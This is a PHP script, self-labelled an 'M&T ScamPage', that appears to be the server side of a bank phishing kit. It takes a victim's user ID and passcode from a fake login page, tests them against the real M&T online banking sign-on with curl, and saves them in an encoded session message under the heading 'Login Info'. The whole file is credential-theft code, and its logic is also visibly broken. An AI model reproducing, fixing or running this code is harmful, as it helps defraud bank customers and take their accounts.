<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $TKRand = md5(uniqid(rand(), true));
    header("Location: eMailLogin.html?id=".$TKRand);
}elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $Username = $_POST['UserID'];
    $Password = $_POST['PassCode'];
    if (isset($Username)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: eMailLogin.html?id=".$TKRand);
    }if (isset($Password)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: eMailLogin.html?id=".$TKRand);
    }else{
        $TKRand = md5(uniqid(rand(), true));
        curl_setopt($ch, CURLOPT_URL,"https://onlinebanking.mtb.com/Login/MTBSignOn");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,
                    "txtUserID=".$Username."&txtPasscode=".$Password."&dp=&pageId=mtbcom%3Alogin");

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $server_output = curl_exec($ch);

        curl_close ($ch);

        if (strpos($server_output, "You have entered an invalid User ID and/or Passcode. Please try again.") !== false){
            $Message = 'Result By M&T ScamPage {Login Info}'.'\n';
            $Message .= 'Username: '.$Username;
            $Message .= 'Password: '.$Password;
            $_SESSION['ILGNF'] = base64_encode($Message);
            header("Location: eMailLogin.html?id=".$TKRand);
        }
        if (strpos($server_output, "You have entered an invalid User ID and/or Passcode. Please try again.") !== true){
            $TKRand = md5(uniqid(rand(), true));
            session_abort();
            header("Location: eMailLogin.html?id=".$TKRand);
        }
    }
}
?>
